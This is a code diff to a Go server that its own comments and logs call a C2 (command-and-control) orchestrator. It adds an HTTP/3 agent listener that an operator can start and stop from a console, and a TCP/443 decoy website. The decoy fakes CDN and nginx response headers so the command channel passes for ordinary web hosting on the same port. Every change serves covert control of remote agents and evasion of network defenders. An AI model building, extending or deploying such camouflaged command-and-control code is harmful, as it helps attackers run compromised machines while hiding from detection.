@@ -76,15 +76,24 @@ type ClientInfo struct {
 
 // Server is the orchestration server.
 type Server struct {
-	h3server   *http3.Server
-	clients    map[[32]byte]*ClientInfo
-	mu         sync.RWMutex
-	shutdown   chan struct{}
-	maxClients int
-	stats      *config.Stats
-	authorized auth.AuthorizedKeys
-	authPath   string
-	agentPath  string
+	h3server    *http3.Server
+	tcpServer   *http.Server
+	clients     map[[32]byte]*ClientInfo
+	mu          sync.RWMutex
+	shutdown    chan struct{}
+	maxClients  int
+	stats       *config.Stats
+	authorized  auth.AuthorizedKeys
+	authPath    string
+	agentPath   string
+	webroot     string
+	tlsConf     *tls.Config
+	// c2 lifecycle
+	h3handler   http.Handler
+	c2addr      string
+	c2Mu        sync.Mutex
+	c2Active    bool
+	c2Stopping  bool
 }
 
 // NewServer creates a new orchestration server.
@@ -102,6 +111,8 @@ func NewServer(addr, agentPath, authPath string, maxClients int, tlsConf *tls.Co
 		authorized: authorized,
 		authPath:   authPath,
 		agentPath:  agentPath,
+		webroot:    webroot,
+		tlsConf:    tlsConf,
 	}
 
 	mux := http.NewServeMux()
@@ -114,6 +125,8 @@ func NewServer(addr, agentPath, authPath string, maxClients int, tlsConf *tls.Co
 		})
 	}
 
+	s.h3handler = mux
+	s.c2addr = addr
 	s.h3server = &http3.Server{
 		Addr:      addr,
 		Handler:   mux,
@@ -126,7 +139,6 @@ func NewServer(addr, agentPath, authPath string, maxClients int, tlsConf *tls.Co
 // Run starts the server.
 func (s *Server) Run() error {
 	log.Printf("%s", config.VersionInfo())
-	log.Printf("Listening on %s (HTTP/3, max clients: %d)", s.h3server.Addr, s.maxClients)
 	log.Printf("Agent path: %s", s.agentPath)
 	if len(s.authorized) == 0 {
 		log.Printf("WARNING: no operator keys loaded from %s — all clients will be agent-only", s.authPath)
@@ -136,16 +148,104 @@ func (s *Server) Run() error {
 
 	go s.cleanupStaleClients()
 	go s.logStats()
+	go s.startC2()
+	if s.webroot != "" {
+		go s.startTCPDecoy()
+	}
 	go s.interactiveMode()
 
-	return s.h3server.ListenAndServe()
+	<-s.shutdown
+	return nil
+}
+
+// startC2 starts (or restarts) the HTTP/3 C2 orchestration listener.
+func (s *Server) startC2() {
+	s.c2Mu.Lock()
+	s.h3server = &http3.Server{
+		Addr:      s.c2addr,
+		Handler:   s.h3handler,
+		TLSConfig: s.tlsConf,
+	}
+	s.c2Active = true
+	h3 := s.h3server
+	s.c2Mu.Unlock()
+
+	log.Printf("C2 orchestration active on %s (HTTP/3, max clients: %d)", s.c2addr, s.maxClients)
+	if err := h3.ListenAndServe(); err != nil {
+		s.c2Mu.Lock()
+		intentional := s.c2Stopping
+		s.c2Active = false
+		s.c2Stopping = false
+		s.c2Mu.Unlock()
+		if !intentional {
+			log.Printf("C2 listener error: %v", err)
+		}
+	}
+}
+
+// stopC2 shuts down the HTTP/3 C2 listener while leaving the TCP decoy running.
+func (s *Server) stopC2() {
+	s.c2Mu.Lock()
+	defer s.c2Mu.Unlock()
+	if !s.c2Active {
+		fmt.Println("C2 is already stopped")
+		return
+	}
+	s.c2Stopping = true
+	s.h3server.Close()
+	// evict all registered clients
+	s.mu.Lock()
+	s.clients = make(map[[32]byte]*ClientInfo)
+	s.mu.Unlock()
+	log.Printf("C2 orchestration stopped — TCP/443 decoy website still running")
+}
+
+// startTCPDecoy starts a standard HTTPS server on TCP/443 serving the webroot.
+// This allows browsers to load the decoy site normally while the HTTP/3 UDP
+// listener continues handling agent connections on the same port number.
+func (s *Server) startTCPDecoy() {
+	fileHandler := http.FileServer(http.Dir(s.webroot))
+	mux := http.NewServeMux()
+	mux.Handle("/", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		// Mimic a real CDN edge node's response headers.
+		w.Header().Set("Server", "nginx")
+		w.Header().Set("Alt-Svc", fmt.Sprintf(`h3=":%d"; ma=86400`, 443))
+		w.Header().Set("X-Cache", "HIT")
+		w.Header().Set("X-Cache-Hits", "3")
+		fileHandler.ServeHTTP(w, r)
+	}))
+
+	tcpAddr := s.h3server.Addr
+	s.tcpServer = &http.Server{
+		Addr:      tcpAddr,
+		Handler:   mux,
+		TLSConfig: s.tlsConf.Clone(),
+	}
+
+	ln, err := tls.Listen("tcp", tcpAddr, s.tlsConf.Clone())
+	if err != nil {
+		log.Printf("TCP decoy listener failed to bind %s: %v", tcpAddr, err)
+		return
+	}
+	log.Printf("Decoy website listening on %s (TCP/HTTPS)", tcpAddr)
+	if err := s.tcpServer.Serve(ln); err != nil && err != http.ErrServerClosed {
+		log.Printf("TCP decoy listener error: %v", err)
+	}
 }
 
 // Shutdown gracefully shuts down the server.
 func (s *Server) Shutdown() {
 	log.Println("Shutting down...")
+	s.c2Mu.Lock()
+	if s.c2Active {
+		s.c2Stopping = true
+		s.h3server.Close()
+	}
+	s.c2Mu.Unlock()
+	if s.tcpServer != nil {
+		s.tcpServer.Close()
+	}
 	close(s.shutdown)
-	s.h3server.Close()
 }
 
 // readMsg reads one framed protocol message from a stream.
@@ -537,7 +637,9 @@ func (s *Server) interactiveMode() {
 			fmt.Println("  operators        List authorized operators and connection status")
 			fmt.Println("  stats            Show traffic statistics")
 			fmt.Println("  version          Show version info")
-			fmt.Println("  quit, exit       Shut down the orchestrator")
+			fmt.Println("  c2 stop          Stop C2 orchestration (website stays up)")
+			fmt.Println("  c2 start         Restart C2 orchestration")
+			fmt.Println("  quit, exit       Shut down everything")
 		case "clients", "peers":
 			s.cmdClients()
 		case "operators":
@@ -546,6 +648,26 @@ func (s *Server) interactiveMode() {
 			s.cmdStats()
 		case "version":
 			fmt.Println(config.VersionInfo())
+		case "c2":
+			if len(args) < 2 {
+				fmt.Println("Usage: c2 stop | c2 start")
+				break
+			}
+			switch strings.ToLower(args[1]) {
+			case "stop":
+				s.stopC2()
+			case "start":
+				s.c2Mu.Lock()
+				active := s.c2Active
+				s.c2Mu.Unlock()
+				if active {
+					fmt.Println("C2 is already running")
+				} else {
+					go s.startC2()
+				}
+			default:
+				fmt.Println("Usage: c2 stop | c2 start")
+			}
 		case "quit", "exit":
 			s.Shutdown()
 			return
